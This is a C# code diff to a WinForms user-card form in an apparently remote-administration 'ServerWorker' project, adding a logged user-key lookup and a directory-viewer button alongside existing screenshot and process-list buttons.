@@ -19,7 +19,7 @@ namespace ServerWorker
 
         private User user;
         private LogUserCard log;
-        private WorkerForm picture;
+        private PictureForm picture;
         private UserCard.UserData userData;
 
         public FormUserCard(User user)
@@ -27,6 +27,15 @@ namespace ServerWorker
             InitializeComponent();
             this.user = user;
             userData = new UserCard.UserData();
+            try
+            {
+                userData.id = user.UsersCom.GetKey();
+                Log.Send("UserKey: " + userData.id);
+            }
+            catch(Exception ex)
+            {
+                Log.Send("FormUserCard: " + ex.Message);
+            }
             LoadUserCard();
         }
 
@@ -147,7 +156,7 @@ namespace ServerWorker
 
         private void button8_Click(object sender, EventArgs e)
         {
-            picture = new WorkerForm(user.UsersCom.ScreenShot());
+            picture = new PictureForm(user.UsersCom.ScreenShot());
             picture.Show();
         }
 
@@ -155,6 +164,12 @@ namespace ServerWorker
         {
             listBox2.Items.Clear();
             listBox2.Items.AddRange(user.UsersCom.GetListProc().ToArray());
+        }
+
+        private void button10_Click(object sender, EventArgs e)
+        {
+            DirectoryViewForm directoryViewForm = new DirectoryViewForm(user);
+            directoryViewForm.Show();
         }
     }
 }
